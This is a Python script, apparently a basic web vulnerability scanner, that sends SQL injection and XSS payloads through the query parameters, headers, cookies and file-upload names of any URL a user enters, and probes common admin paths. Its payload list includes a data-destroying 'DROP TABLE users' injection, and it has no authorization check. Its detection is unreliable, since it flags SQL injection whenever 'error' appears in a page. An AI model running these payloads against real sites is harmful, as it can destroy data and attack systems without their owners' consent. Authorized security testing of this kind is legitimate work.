import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
import colorama
from colorama import Fore, Style

colorama.init()

# Payloads for SQL Injection and XSS
SQLI_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT null, version(); --"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

# Custom headers for testing
TEST_HEADERS = {
    "User-Agent": "' OR '1'='1",
    "Referer": "<script>alert('XSS')</script>",
    "X-Custom-Header": "' UNION SELECT null, version(); --"
}

# Test cookies for vulnerabilities
TEST_COOKIES = {
    "session_id": "' OR '1'='1",
    "tracking_id": "<script>alert('XSS')</script>"
}

def find_forms(url):
    """Fetch and return all forms from a given URL."""
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Could not fetch forms from {url}: {e}")
        return []

def test_query_parameters(url, payloads, vuln_type):
    """Test query parameters in the URL for vulnerabilities."""
    print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} Testing query parameters for {vuln_type}...")
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    if not query_params:
        print(f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} No query parameters to test.")
        return False
    vulnerable = False
    for param, values in query_params.items():
        for payload in payloads:
            test_params = query_params.copy()
            test_params[param] = payload
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"
            try:
                response = requests.get(test_url)
                if vuln_type == "SQL Injection" and ("SQL" in response.text or "error" in response.text):
                    print(f"{Fore.GREEN}[VULNERABLE]{Style.RESET_ALL} SQL Injection in parameter '{param}' with payload: {payload}")
                    vulnerable = True
                elif vuln_type == "XSS" and payload in response.text:
                    print(f"{Fore.GREEN}[VULNERABLE]{Style.RESET_ALL} XSS in parameter '{param}' with payload: {payload}")
                    vulnerable = True
            except Exception as e:
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error testing parameter '{param}': {e}")
    return vulnerable

def test_headers(url, vuln_type):
    """Test HTTP headers for vulnerabilities."""
    print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} Testing headers for {vuln_type}...")
    vulnerable = False
    for header, payload in TEST_HEADERS.items():
        headers = {header: payload}
        try:
            response = requests.get(url, headers=headers)
            if vuln_type == "SQL Injection" and ("SQL" in response.text or "error" in response.text):
                print(f"{Fore.GREEN}[VULNERABLE]{Style.RESET_ALL} SQL Injection in header '{header}' with payload: {payload}")
                vulnerable = True
            elif vuln_type == "XSS" and payload in response.text:
                print(f"{Fore.GREEN}[VULNERABLE]{Style.RESET_ALL} XSS in header '{header}' with payload: {payload}")
                vulnerable = True
        except Exception as e:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error testing header '{header}': {e}")
    return vulnerable

def test_cookies(url, vuln_type):
    """Test cookies for vulnerabilities."""
    print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} Testing cookies for {vuln_type}...")
    vulnerable = False
    for cookie, payload in TEST_COOKIES.items():
        cookies = {cookie: payload}
        try:
            response = requests.get(url, cookies=cookies)
            if vuln_type == "SQL Injection" and ("SQL" in response.text or "error" in response.text):
                print(f"{Fore.GREEN}[VULNERABLE]{Style.RESET_ALL} SQL Injection in cookie '{cookie}' with payload: {payload}")
                vulnerable = True
            elif vuln_type == "XSS" and payload in response.text:
                print(f"{Fore.GREEN}[VULNERABLE]{Style.RESET_ALL} XSS in cookie '{cookie}' with payload: {payload}")
                vulnerable = True
        except Exception as e:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error testing cookie '{cookie}': {e}")
    return vulnerable

def test_dynamic_content(url, payloads):
    """Test for dynamic content injection vulnerabilities."""
    print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} Testing dynamic content injection...")
    vulnerable = False
    for payload in payloads:
        test_url = f"{url}?content={payload}"
        try:
            response = requests.get(test_url)
            if payload in response.text:
                print(f"{Fore.GREEN}[VULNERABLE]{Style.RESET_ALL} Dynamic content injection with payload: {payload}")
                vulnerable = True
        except Exception as e:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error testing dynamic content injection: {e}")
    return vulnerable


def test_admin_panels(url):
    """Test common admin panel endpoints."""
    print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} Testing admin panel endpoints...")
    admin_paths = ["/admin", "/administrator", "/admin/login", "/admin/dashboard"]
    for path in admin_paths:
        test_url = urljoin(url, path)
        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Admin panel found at {test_url}.")
            else:
                print(f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} Admin panel not found at {test_url}.")
        except Exception as e:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error testing admin panel: {e}")

def test_file_metadata(url, file_payload):
    """Test metadata in uploaded files for vulnerabilities."""
    print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} Testing file metadata...")
    files = {'file': ('<script>alert("XSS")</script>.txt', file_payload)}
    try:
        response = requests.post(url, files=files)
        if "XSS" in response.text:
            print(f"{Fore.GREEN}[VULNERABLE]{Style.RESET_ALL} File metadata vulnerability detected.")
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error testing file metadata: {e}")

def main(url):
    """Main function to run the scanner for all vulnerabilities."""
    print(f"{Fore.BLUE}[START]{Style.RESET_ALL} Scanning URL: {url}")

    # Query Parameters
    test_query_parameters(url, SQLI_PAYLOADS, "SQL Injection")
    test_query_parameters(url, XSS_PAYLOADS, "XSS")

    # Headers
    test_headers(url, "SQL Injection")
    test_headers(url, "XSS")

    # Cookies
    test_cookies(url, "SQL Injection")
    test_cookies(url, "XSS")

    # Dynamic Content Injection
    test_dynamic_content(url, XSS_PAYLOADS)



    # Admin Panel Inputs
    test_admin_panels(url)

    # File Metadata
    test_file_metadata(url, "Sample payload for file upload vulnerability testing.")

    print(f"{Fore.MAGENTA}[SUMMARY]{Style.RESET_ALL} Scan completed.")
    print(f"{Fore.BLUE}[END]{Style.RESET_ALL} Thank you for using the scanner!")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    main(target_url)
